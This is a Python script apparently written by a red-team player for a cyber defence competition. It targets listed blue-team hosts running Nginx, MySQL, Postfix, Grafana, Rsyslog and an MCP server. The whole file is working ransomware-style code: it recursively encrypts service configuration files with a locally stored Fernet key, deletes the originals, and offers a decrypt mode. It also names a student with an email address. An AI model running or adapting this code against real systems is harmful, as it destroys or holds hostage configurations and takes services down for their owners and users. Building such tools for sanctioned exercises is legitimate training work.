#!/usr/bin/env python3
"""
Marissa Ventresca
Team Alpha - Red
mrv7315@rit.edu


Scored Service File Encryptor - EOD day 1
Encrypts scored  conf files using AES-256 fernet.
Usage: python3 encrypt_services.py [--decrypt] --key <keyfile>
"""

import os
import argparse
from pathlib import Path
from cryptography.fernet import Fernet

# Config paths per scored service:
# blue1-cross-check  10.100.2.3  MCP Server  — check box for path??
# blue1-hat-trick    10.100.2.4  Nginx
# blue1-triple-deke  10.100.2.5  MySQL
# blue1-toe-drag     10.100.2.6  Mail (Postfix)
# blue1-clapper      10.100.2.7  Grafana
# blue1-backcheck    10.100.2.8  Rsyslog
# blue2-cross-check  10.100.3.3  MCP Server  — check box for path??
# blue2-hat-trick    10.100.3.4  Nginx
# blue2-triple-deke  10.100.3.5  MySQL
# blue2-toe-drag     10.100.3.6  Mail (Postfix)
# blue2-clapper      10.100.3.7  Grafana
# blue2-backcheck    10.100.3.8  Rsyslog
 
TARGET_DIRS = [
    "/etc/nginx",           # Nginx (hat-trick)
    "/etc/mysql",           # MySQL (triple-deke)
    "/etc/mysql/mysql.conf.d",
    "/etc/postfix",         # Mail (toe-drag)
    "/etc/dovecot",         # Mail companion if dovecot is present
    "/etc/grafana",         # Grafana (clapper)
    "/etc/rsyslog.d",       # Rsyslog (backcheck)
    "/etc/rsyslog.conf",    # Rsyslog main config (backcheck)
    "/opt/ref_review_mcp/ref_review_mcp.py",     # MCP config file
]
ENCRYPTED_EXT = ".enc"


def generate_key(keyfile: str): 
    key = Fernet.generate_key()
    with open(keyfile, "wb") as f:
        f.write(key)
    print(f"[+] Key saved to {keyfile}!")
    return key


def load_key(keyfile: str) -> bytes:
    with open(keyfile, "rb") as f:
        return f.read()


def encrypt_file(path: Path, fernet: Fernet):
    data = path.read_bytes()
    encrypted = fernet.encrypt(data)
    enc_path = path.with_suffix(path.suffix + ENCRYPTED_EXT)
    enc_path.write_bytes(encrypted)
    path.unlink()  #removes original
    print(f"  [ENC] {path} -> {enc_path.name}")


def decrypt_file(path: Path, fernet: Fernet):
    data = path.read_bytes()
    decrypted = fernet.decrypt(data)
    orig_path = Path(str(path)[: -len(ENCRYPTED_EXT)])
    orig_path.write_bytes(decrypted)
    path.unlink()
    print(f"  [DEC] {path} -> {orig_path.name}")


def process_dirs(dirs, fernet: Fernet, decrypt: bool):
    action = decrypt_file if decrypt else encrypt_file
    ext_filter = ENCRYPTED_EXT if decrypt else None

    for d in dirs:
        p = Path(d)
        if not p.exists():
            print(f"[!] Skipping missing path: {d}")
            continue
        files = list(p.rglob("*"))
        for f in files:
            if not f.is_file():
                continue
            if decrypt and not f.name.endswith(ENCRYPTED_EXT):
                continue
            if not decrypt and f.name.endswith(ENCRYPTED_EXT):
                continue
            try:
                action(f, fernet)
            except Exception as e:
                print(f"  [ERR] {f}: {e}")


def main():
    parser = argparse.ArgumentParser(description="Service file encryptor for competitions")
    parser.add_argument("--decrypt", action="store_true", help="Decrypt instead of encrypt")
    parser.add_argument("--key", required=False, help="Path to keyfile (generated if missing)")
    args = parser.parse_args()

    keyfile = args.key or "competition.key"

    if not args.decrypt and not os.path.exists(keyfile):
        key = generate_key(keyfile)
    else:
        key = load_key(keyfile)

    fernet = Fernet(key)
    mode = "DECRYPTING" if args.decrypt else "ENCRYPTING"
    print(f"\n[*] {mode} scored service files...\n")
    process_dirs(TARGET_DIRS, fernet, decrypt=args.decrypt)
    print("\n[+] Done.")


if __name__ == "__main__":
    main()
